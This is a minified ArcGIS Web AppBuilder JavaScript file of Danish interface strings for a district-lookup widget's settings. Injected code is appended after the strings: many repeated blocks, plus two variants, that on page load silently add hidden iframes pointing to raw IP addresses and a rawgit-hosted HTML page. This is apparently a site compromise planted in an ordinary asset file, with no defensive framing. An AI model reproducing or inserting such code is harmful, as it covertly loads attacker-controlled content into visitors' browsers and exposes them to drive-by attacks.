// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Miles",kilometers:"Kilometer",feet:"Fod",meters:"Meter"},layerSetting:{layerSettingTabTitle:"S\u00f8geindstillinger",buttonSet:"Indstil",selectLayersLabel:"V\u00e6lg lag",selectLayersHintText:"Tip: Bruges til at v\u00e6lge polygonlaget og dets tilknyttede punktlag.",selectPrecinctSymbolLabel:"V\u00e6lg symbol for at fremh\u00e6ve polygon",selectGraphicLocationSymbol:"Adresse- eller positionssymbol",graphicLocationSymbolHintText:"Tip: Symbol for s\u00f8gt adresse eller klikket position",
precinctSymbolHintText:"Tip: Bruges til at vise symbol for den valgte polygon",selectColorForPoint:"V\u00e6lg farve for at fremh\u00e6ve punkt",selectColorForPointHintText:"Tip: Bruges til at vise fremh\u00e6vningsfarve for det valgte punkt"},searchSourceSetting:{searchSourceSettingTabTitle:"S\u00f8gekildeindstillinger",searchSourceSettingTitle:"S\u00f8gekildeindstillinger",searchSourceSettingTitleHintText:"Tilf\u00f8j og konfigur\u00e9r geokodningstjenester eller vektorlag som s\u00f8gekilder. Disse specificerede kilder bestemmer, hvad der kan s\u00f8ges efter i s\u00f8geboksen.",
addSearchSourceLabel:"Tilf\u00f8j s\u00f8gekilde",featureLayerLabel:"Vektorlag",geocoderLabel:"Geokoder",nameTitle:"Navn",generalSettingLabel:"Generel indstilling",allPlaceholderLabel:"Pladsholdertekst for s\u00f8gning efter alle:",allPlaceholderHintText:"Tip: Indtast den tekst, der skal vises som pladsholder, mens der s\u00f8ges i alle lag og geokoder",generalSettingCheckboxLabel:"Vis pop-up for det fundne objekt eller den fundne position",countryCode:"Lande- eller regionskode(r)",countryCodeEg:"f.eks. ",
countryCodeHint:"Hvis denne v\u00e6rdi er tom, bliver der s\u00f8gt efter alle lande og regioner",questionMark:"?",searchInCurrentMapExtent:"S\u00f8g kun inden for den aktuelle kortudstr\u00e6kning",zoomScale:"Zoom-skala",locatorUrl:"Geokodnings-URL",locatorName:"Navn p\u00e5 geokodningsfunktion",locatorExample:"Eksempel",locatorWarning:"Denne version af geokodningstjenesten underst\u00f8ttes ikke. Widget'en underst\u00f8tter Geokodningstjeneste version 10.0 og nyere.",locatorTips:"Forslag er ikke tilg\u00e6ngelige, fordi geokodningstjenesten ikke underst\u00f8tter forslagsfunktionen.",
layerSource:"Lagkilde",setLayerSource:"Angiv lagkilde",setGeocoderURL:"Angiv geokodnings-URL",searchLayerTips:"Forslag er ikke tilg\u00e6ngelige, fordi featuretjenesten ikke underst\u00f8tter forslagsfunktionen.",placeholder:"Pladsholdertekst",searchFields:"S\u00f8gefelter",displayField:"Visningsfelt:",exactMatch:"N\u00f8jagtigt match",maxSuggestions:"Maksimalt antal forslag",maxResults:"Maksimalt antal resultater",enableLocalSearch:"Aktiv\u00e9r lokal s\u00f8gning",minScale:"Min. m\u00e5lestok",
minScaleHint:"N\u00e5r kortm\u00e5lestokken er st\u00f8rre end denne m\u00e5lstok, anvendes lokal s\u00f8gning",radius:"Radius",radiusHint:"Angiver radius for et omr\u00e5de omkring det aktuelle kortcentrum, der benyttes til at booste rangordningen af geokodningsforslag, s\u00e5 de forslag, der ligger t\u00e6ttest p\u00e5 placeringen, returneres f\u00f8rst",meters:"Meter",setSearchFields:"Indstil s\u00f8gefelter",set:"Angiv",fieldName:"Navn",invalidUrlTip:"URL\u2019en ${URL} er ugyldig eller utilg\u00e6ngelig.",
invalidSearchSources:"Ugyldige s\u00f8gekildeindstillinger"},layerSelector:{selectPolygonLayerLabel:"V\u00e6lg polygonlag",selectPolygonLayerHintText:"Tip: Bruges til at v\u00e6lge polygonlag.",selectRelatedPointLayerLabel:"V\u00e6lg det punktlag, der er knyttet til polygonlaget",selectRelatedPointLayerHintText:"Tip: Bruges til at v\u00e6lge det punktlag, der er knyttet til polygonlaget",polygonLayerNotHavingRelatedLayer:"V\u00e6lg et polygonlag med et tilknyttet punktlag.",errorInSelectingPolygonLayer:"V\u00e6lg et polygonlag med et tilknyttet punktlag.",
errorInSelectingRelatedLayer:"V\u00e6lg det punktlag, der er knyttet til polygonlaget."},routeSetting:{routeSettingTabTitle:"Indstillinger for k\u00f8rselsvejledninger",routeServiceUrl:"Rutetjeneste",buttonSet:"Indstil",routeServiceUrlHintText:"Tip: Klik p\u00e5 \u2018Indstil\u2019 for at g\u00e5 til og v\u00e6lge en netv\u00e6rksanalysetjeneste for ruter",directionLengthUnit:"L\u00e6ngdeenheder for k\u00f8rselsvejledning",unitsForRouteHintText:"Tip: Bruges til at vise rapporterede enheder for ruten",
selectRouteSymbol:"V\u00e6lg symbol for visning af rute",routeSymbolHintText:"Tip: Brug visningslinjesymbolet for ruten",routingDisabledMsg:"For at aktivere k\u00f8rselsvejledninger skal du s\u00f8rge for, at ruteplanl\u00e6gning er aktiveret i ArcGIS Online-elementet."},networkServiceChooser:{arcgislabel:"Tilf\u00f8j fra ArcGIS Online",serviceURLabel:"Tilf\u00f8j tjeneste-URL",routeURL:"Rute-URL",validateRouteURL:"Bekr\u00e6ft",exampleText:"Eksempel",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",
hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Angiv en gyldig rutetjeneste.",rateLimitExceeded:"Begr\u00e6nsning overskredet. Pr\u00f8v igen senere.",errorInvokingService:"Brugernavn eller adgangskode er forkert."},symbolPickerPreviewText:"Forh\u00e5ndsvisning:",showToolToSelectLabel:"Knap til angivelse af placering",showToolToSelectHintText:"Tip: Opretter en knap til angivelse af placering p\u00e5 kortet i stedet for altid at skulle angive placeringen, n\u00e5r der klikkes p\u00e5 kortet",
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});